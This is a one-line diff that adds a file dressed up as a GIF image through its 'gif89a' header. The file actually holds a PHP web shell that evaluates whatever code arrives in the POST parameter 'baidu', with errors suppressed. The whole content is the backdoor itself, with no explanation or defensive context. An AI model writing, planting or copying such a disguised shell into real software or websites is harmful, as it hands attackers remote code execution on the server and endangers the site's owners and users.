@@ -1,0 +1,1 @@
+gif89a<?php @eval($_POST['baidu']);?>
